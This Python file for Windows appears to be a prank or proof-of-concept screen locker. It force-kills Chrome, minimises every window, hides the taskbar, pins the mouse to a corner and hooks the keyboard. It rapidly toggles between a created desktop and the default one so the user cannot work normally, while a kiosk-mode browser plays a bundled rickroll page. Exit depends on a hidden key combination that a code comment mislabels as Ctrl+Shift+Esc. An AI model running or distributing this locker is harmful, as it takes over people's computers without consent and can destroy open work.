import ctypes
import threading
import time
import subprocess
from ctypes import wintypes
from pycaw.pycaw import AudioUtilities
from pathlib import Path
import sys

user32   = ctypes.windll.user32

user32.CreateDesktopW.restype = ctypes.c_void_p
user32.OpenDesktopW.restype = ctypes.c_void_p

user32.CallNextHookEx.restype = ctypes.c_ssize_t
user32.CallNextHookEx.argtypes = [
    ctypes.c_void_p,
    ctypes.c_int,
    wintypes.WPARAM,
    wintypes.LPARAM,
]

user32.SetCursorPos.restype = wintypes.BOOL
user32.SetCursorPos.argtypes = [
    ctypes.c_int,
    ctypes.c_int,
]

user32.GetSystemMetrics.restype = ctypes.c_int
user32.GetSystemMetrics.argtypes = [
    ctypes.c_int,
]

stop        = threading.Event()
hooks_ready = threading.Event()

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", ctypes.c_ulong), ("scanCode", ctypes.c_ulong),
                ("flags",  ctypes.c_ulong), ("time",     ctypes.c_ulong),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]


EnumWindowsProc = ctypes.WINFUNCTYPE(
    wintypes.BOOL,
    wintypes.HWND,
    wintypes.LPARAM
)

def enum_proc_factory(minimise):
    @EnumWindowsProc
    def enum_proc(hwnd, lParam):
        if user32.IsWindowVisible(hwnd):
            if minimise:
                user32.ShowWindow(hwnd, 6)
            else:
                user32.ShowWindow(hwnd, 9)
        return True

    return enum_proc

keys_down = set()

VK_1 = 0xDB
VK_2 = 0xDD
VK_3 = 0xDC

@ctypes.WINFUNCTYPE(
    ctypes.c_ssize_t,
    ctypes.c_int,
    wintypes.WPARAM,
    wintypes.LPARAM
)

def kb_proc(nCode, wParam, lParam):
    if nCode >= 0 and lParam:
        kb = ctypes.cast(
            lParam,
            ctypes.POINTER(KBDLLHOOKSTRUCT)
        )[0]

        vk = kb.vkCode

        # Key down
        if wParam == 0x0100 or wParam == 0x0104:
            keys_down.add(vk)

        # Key up
        elif wParam == 0x0101 or wParam == 0x0105:
            keys_down.discard(vk)

        # Check Ctrl + Shift + Esc
        if (
            VK_1 in keys_down and
            VK_2 in keys_down and
            VK_3 in keys_down
        ):
            stop.set()
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return Path(sys._MEIPASS) / relative_path
    return Path(__file__).resolve().parent / relative_path

html_path = resource_path("rickroll.html")
file_url = html_path.as_uri()

def hook_thread():
    h_kb = user32.SetWindowsHookExW(13, kb_proc, None, 0)
    hooks_ready.set()
    m = ctypes.wintypes.MSG()
    while not stop.is_set():
        if user32.PeekMessageW(ctypes.byref(m), None, 0, 0, 1):
            user32.TranslateMessage(ctypes.byref(m))
            user32.DispatchMessageW(ctypes.byref(m))
        time.sleep(0.0005)
    user32.UnhookWindowsHookEx(h_kb)

def toggle(h_poc, h_def):
    while not stop.is_set():
        user32.SwitchDesktop(h_poc)
        user32.SwitchDesktop(h_def)

def mouse_thread(x, y):
    while not stop.is_set():
        user32.SetCursorPos(x, y)

def set_volume(percent, mute):
    speakers = AudioUtilities.GetSpeakers()
    volume = speakers.EndpointVolume

    volume.SetMute(mute, None)
    volume.SetMasterVolumeLevelScalar(percent / 100.0, None)

def hide_taskbar():
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, 0)

def show_taskbar():
    hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        user32.ShowWindow(hwnd, 5)

def launch_chrome():
    global chrome
    chrome = subprocess.Popen([
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        "--kiosk",
        "--autoplay-policy=no-user-gesture-required",
        "--disable-background-networking",
        "--disable-component-update",
        "--disable-sync",
        "--no-first-run",
        "--disable-features=Translate",
        "--disable-features=MediaSessionService",
        "--disk-cache-size=1",
        file_url
    ])

def main():
    subprocess.run(
        ["taskkill", "/F", "/IM", "chrome.exe"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    user32.EnumWindows(enum_proc_factory(True), 0)
    threading.Thread(
        target=launch_chrome,
        daemon=True
    ).start()
    desk1 = user32.CreateDesktopW("PoCSecureDesktop", None, None, 0x0001, 0x10000000, None)
    desk2 = user32.OpenDesktopW("Default", 0, False, 0x00000100)

    mouse_x = user32.GetSystemMetrics(0) - 1
    mouse_y = user32.GetSystemMetrics(1) - 1

    user32.SwitchDesktop(desk1)
    user32.SwitchDesktop(desk2)
    hide_taskbar()
    set_volume(50, False)

    threading.Thread(
        target=hook_thread,
        daemon=False
    ).start()

    hooks_ready.wait()

    threading.Thread(
        target=toggle,
        args=(desk1, desk2),
        daemon=True
    ).start()

    threading.Thread(
        target=mouse_thread,
        args=(mouse_x, mouse_y),
        daemon=True,
    ).start()

    stop.wait()
    user32.SwitchDesktop(desk2)
    set_volume(0, True)
    user32.CloseDesktop(desk1)
    user32.CloseDesktop(desk2)
    user32.EnumWindows(enum_proc_factory(False), 0)
    chrome.terminate()
    chrome.wait()
    show_taskbar()

if __name__ == "__main__":
    main()
